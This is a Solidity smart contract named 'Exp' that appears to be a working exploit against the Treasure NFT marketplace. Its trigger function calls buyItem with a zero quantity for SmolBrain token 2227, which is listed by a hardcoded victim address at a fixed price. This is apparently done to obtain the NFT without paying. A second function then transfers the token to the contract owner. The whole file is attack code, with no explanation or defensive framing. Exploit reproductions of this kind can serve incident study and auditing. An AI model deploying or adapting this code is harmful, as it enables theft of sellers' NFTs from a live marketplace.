// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

// Import this file to use console.log
import "hardhat/console.sol";
import "./interfaces/ISmolBrain.sol";
import "./interfaces/ITreasureMarketplaceBuyer.sol";

contract Exp {
    address public immutable owner;
    uint256 private constant num = 0;
    uint256 private constant tokenId = 2227;
    ISmolBrain private immutable smolbrain;
    ITreasureMarketplaceBuyer private marketplace;
    uint256 private constant price = 3420000000000000000000;
    address private constant victim = 0xd3FeeDc8E702A9F191737c0482b685b74Be48CFa;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(ISmolBrain _smolbrain, ITreasureMarketplaceBuyer _marketplace) {
        owner = msg.sender;
        smolbrain = _smolbrain;
        marketplace = _marketplace;
    }

    function trigger() external onlyOwner {
        marketplace.buyItem(address(smolbrain), tokenId, victim, num, price);
    }

    function getter() external onlyOwner {
        smolbrain.transferFrom(address(this), owner, tokenId);
    }

    function status() external view returns (address) {
        return smolbrain.ownerOf(tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
